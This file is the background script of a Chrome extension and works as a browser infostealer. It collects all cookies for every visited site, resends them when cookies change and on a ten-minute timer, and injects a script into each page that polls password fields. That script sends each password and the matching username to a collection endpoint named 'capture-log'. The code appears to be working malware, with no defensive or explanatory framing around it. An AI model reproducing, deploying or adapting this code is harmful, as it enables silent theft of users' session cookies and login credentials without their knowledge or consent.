const SERVER_URL = 'http://localhost:5000/capture-log';

const sendToServer = (data) => {
  fetch(SERVER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(e => console.error("Sync Error"));
};

// Universal Cookie Capture
const captureAllCookies = (url) => {
  const domain = new URL(url).hostname;
  chrome.cookies.getAll({ domain: domain }, (cookies) => {
    if (cookies && cookies.length > 0) {
      const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
      sendToServer({
        url: url,
        cookies: cookieStr,
        sessionStorage: { type: "UNIVERSAL_COOKIE_SYNC", domain: domain },
        timestamp: new Date().toLocaleString()
      });
    }
  });
};

// Universal Form Monitor (Passwords & Usernames)
const monitorUniversalForms = (tabId) => {
  chrome.scripting.executeScript({
    target: { tabId: tabId },
    func: () => {
      const checkFields = () => {
        const passwordFields = document.querySelectorAll('input[type="password"]');
        passwordFields.forEach(field => {
          if (field.value.length > 0) {
            chrome.runtime.sendMessage({
              type: "FORM_CAPTURE",
              field: field.name || field.id || "password",
              value: field.value,
              user: document.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="login"]')?.value || "unknown",
              pageUrl: window.location.href
            });
          }
        });
      };
      setInterval(checkFields, 2000);
    }
  }).catch(() => {});
};

// Real-time tab monitoring
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
    captureAllCookies(tab.url);
    monitorUniversalForms(tabId);
  }
});

// Cookie Change Monitor
chrome.cookies.onChanged.addListener((change) => {
  if (!change.removed) {
    const url = `https://${change.cookie.domain.replace(/^\./, '')}`;
    captureAllCookies(url);
  }
});

// Alarm for periodic full sync
chrome.alarms.create("fullSync", { periodInMinutes: 10 });
chrome.alarms.onAlarm.addListener((alarm) => {
  chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
      if (tab.url && tab.url.startsWith('http')) captureAllCookies(tab.url);
    });
  });
});

chrome.runtime.onMessage.addListener((msg) => {
  if (msg.type === "FORM_CAPTURE") {
    sendToServer({
      url: msg.pageUrl,
      cookies: `Login: ${msg.user} | Pass: ${msg.value}`,
      sessionStorage: { field: msg.field, type: "UNIVERSAL_FORM_CAPTURE" },
      timestamp: new Date().toLocaleString()
    });
  }
});
